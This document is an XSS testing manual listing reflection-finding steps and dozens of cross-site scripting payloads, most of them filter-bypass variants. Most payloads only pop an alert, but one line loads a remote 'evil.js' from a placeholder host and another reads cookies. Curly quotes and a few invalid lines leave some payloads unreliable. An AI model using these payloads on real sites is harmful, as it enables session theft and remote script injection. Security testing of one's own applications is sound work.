# XSS Manual

## Identifying Reflections of User Input

1.  `myxsstestdmqlwp` **Submit this string** as every parameter to every page, targeting only one parameter at a time. Only alphabetical characters.

2.  **Monitor the application's responses** for any appearance of this same string.

3.  **Test both GET and POST** requests. Both the URL query string and the message body.

4.  **Test HTTP request headers.** A common XSS vulnerability arises in error messages, where items such as the _Referer_ and _User-Agent_ headers are copied into the message's contents.

5.  **URL-encode** any special characters, including & = + ; and _space_

## Testing Reflections to Introduce Script

Perform these basic tests on your application:

- Interact with your application. Insert strings that contain HTML and JavaScript metacharacters into all application inputs, such as
  _ forms,
  _ URL parameters,
  _ hidden fields(!),
  _ or cookie values.
- A good test string is `>'>"><img src=x onerror=alert(0)>`.
- If your application doesn't correctly escape this string, you will see an alert and will know that something went wrong.
- Wherever your application handles user-supplied URLs, enter `javascript:alert(0)` or `data:text/html,<script>alert(0)</script>`.
- Create a test user profile with data similar to the test strings above. Use that profile to interact with your application. This can help identify stored XSS bugs.

**Example 1: A Tag Attribute Value**
Suppose that the returned page contains the following:
`<input type="text" name="address1" value="myxsstestdmqlwp">`

Try:
`"><script>alert(1)</script>`
`" onfocus="alert(1)`

**Example 2: A JavaScript String**
If: `<script>var a = 'myxsstestdmqlwp'; var b = 123; ... </script>`
Try:
`'; alert(1); var foo='`
`'; alert(1); //`

**Example 3: An Attribute Containing a URL**
If `<a href="myxsstestdmqlwp">Click here ...</a>`
use the `javascript:` protocol to introduce script directly within the URL attribute.
Try:
`javascript:alert(1);`
`#"onclick="javascript:alert(1)`

### Event Handlers

```
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
<xml onreadystatechange=alert(1)>
<style onreadystatechange=alert(1)>
<iframe onreadystatechange=alert(1)>
<object onerror=alert(1)>
<object type=image src=valid.gif onreadystatechange=alert(1)></object>
<img type=image src=valid.gif onreadystatechange=alert(1)
<input type=image src=valid.gif onreadystatechange=alert(1)
<isindex type=image src=valid.gif onreadystatechange=alert(1)
<script onreadystatechange=alert(1)
<bgsound onpropertychange=alert(1)
<body onbeforeactivate=alert(1)
<body onactivate=alert(1)
<body onfocusin=alert(1)>

<img src=1 onerror="s=document.createElement('script');s.src='//...com/static/evil.js';document.body.appendChild(s);"
```

Use `autofocus` attribute to automatically trigger events that previously required user interaction:

```
<input autofocus onfocus=alert(1)>
<input onblur=alert(1) autofocus><input autofocus>
<body onscroll=alert(1)><br><br>...<br><input autofocus>
```

Event handlers in closing tags:
`</a onmousemove=alert(1)>`

**URLs with #:**
`https://...com/demo/3#'><img src=x onerror=alert(/DOM-XSS/)>`

### Script Pseudo-Protocols

`javascript:`, `data:`, and others

```
<object data=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<form id=test /><button form=test formaction=javascript:alert(1)>
<event-source src=javascript:alert(1)>
https://...com/frame#data:text/plain,alert('xss')
```

## Bypassing Filters: HTML

Ways in which HTML syntax can be obfuscated to defeat common filters.

`<img onerror=alert(1) src=a>`

**The Tag Name**
`<iMg onerror=alert(1) src=a>`

`<[%00]img onerror=alert(1) src=a>`
`<i[%00]mg onerror=alert(1) src=a>`
In these examples, [%XX] indicates the literal character with the hexadecimal ASCII code of XX. When submitting your attack to the application, generally you would use the URL-encoded form of the character. When reviewing the applica-tion's response, you need to look for the literal decoded character being reflected.

**Space Following the Tag Name**

```
<img/onerror=alert(1) src=a>
<img[%09]onerror=alert(1) src=a>
<img[%0d]onerror=alert(1) src=a>
<img[%0a]onerror=alert(1) src=a>
<img/"onerror=alert(1) src=a>
<img/'onerror=alert(1) src=a>
<img/anyjunk/onerror=alert(1) src=a>
<script/anyjunk>alert(1)</script>
```

**Attribute Names**
`<img o[%00]nerror=alert(1) src=a>`

**Attribute Delimiters**

```
<img onerror=”alert(1)”src=a>
<img onerror=’alert(1)’src=a>
<img onerror=`alert(1)`src=a>
<img/onerror=”alert(1)”src=a>

```

**Attribute Values**

```
<img onerror=a[%00]lert(1) src=a>
<img onerror=a&#x6c;ert(1) src=a>
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
<img onerror=a&#x06c;ert(1) src=a>
<img onerror=a&#x006c;ert(1) src=a>
<img onerror=a&#x0006c;ert(1) src=a>
<img onerror=a&#108;ert(1) src=a>
<img onerror=a&#0108;ert(1) src=a>
<img onerror=a&#108ert(1) src=a>
<img onerror=a&#0108ert(1) src=a>

```

**Tag Brackets**

```
%253cimg%20onerror=alert(1)%20src=a%253e
«img onerror=alert(1) src=a»
<<script>alert(1);//<</script>
<script<{alert(1)}/></script>
```

**Using JavaScript Escaping**

```
<script>a\u006cert(1);</script>
<script>eval(‘a\u006cert(1)’);</script>
<script>eval(‘a\x6cert(1)’);</script>
<script>eval(‘a\154ert(1)’);</script>
<script>eval(‘a\l\ert\(1\)’);</script>

```

**Dynamically Constructing Strings**

```
<script>eval(‘al’+’ert(1)’);</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
<script>eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));</script>

```

**Alternatives to eval**

```
<script>’alert(1)’.replace(/.+/,eval)</script>
<script>function::[‘alert’](1)</script>

```

**Alternatives to Dots**

```
<script>alert(document[‘cookie’])</script>
<script>with(document)alert(cookie)</script>
```
